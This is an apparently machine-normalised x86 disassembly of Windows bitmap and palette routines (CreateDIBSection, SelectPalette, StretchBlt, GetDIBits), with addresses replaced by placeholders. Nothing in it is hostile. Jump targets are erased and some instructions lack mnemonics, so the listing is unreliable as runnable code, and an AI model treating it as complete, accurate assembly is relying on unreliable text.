push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_422a70
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4181d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4228c4
retn
sub_425e58
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_40316c
sub_425e78
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_425be4
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d3ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_425ed4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_420c7c
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_425be4
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_425be4
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_425f20
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_42357c
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_425fcf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_425fdc
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_426028
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_425be4
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_422de8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_422de8
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_426676
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026dc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_426380
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_422cc8
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_422de8
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_422de8
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_422de8
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_422de8
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_426627
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_426616
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4265f4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_422de8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_425fdc
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028d8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_42357c
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_42222c
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_416a60
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_42154c
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4221f0
call sub_42154c
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_422d40
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4265fb
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_422de8
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_4265ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_422de8
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026fc
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_42154c
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4221f0
call sub_42154c
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_42154c
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4221f0
call sub_42154c
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_422de8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_4039a4
call sub_4039a4
jmp r-xdata
sub_42661d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_42662c
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403920
call sub_403974
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_42668c
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_4266f0
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_425be4
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4268eb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_422de8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_422de8
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_422de8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4268a3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_426028
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_4268fc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_423f68
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_425e54
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_426964
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax esi
call sub_427074
mov eax [ esi + 0x28 ]
call sub_425e58
mov eax [ esi + 0x2c ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41847c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_4269a0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_426a58
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b80
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4272e4
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_425e54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_425e58
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4184a8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_426a90
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_427074
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_426b1f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_42668c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_426028
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4272e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_426b24
mov eax [ ebp - 0x8 ]
call sub_420c7c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403920
call sub_403974
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_426b50
push ebx
mov ebx eax
mov eax ebx
call sub_426e44
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d3ac
pop ebx
retn
sub_426b80
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41a444
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_427074
lea eax [ ebx + 0x2c ]
call sub_40d3ac
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4272e4
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_426bf4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_422ac4
mov eax ebx
call sub_427184
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_426f80
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_426e30
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4229f0
push eax
call SetStretchBltMode
mov eax ebx
call sub_426ec4
mov dl [ r-xdata ]
call sub_422ac4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_427124
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_426ec4
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e37
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_426dc5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_422de8
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_426ec4
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_422f8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
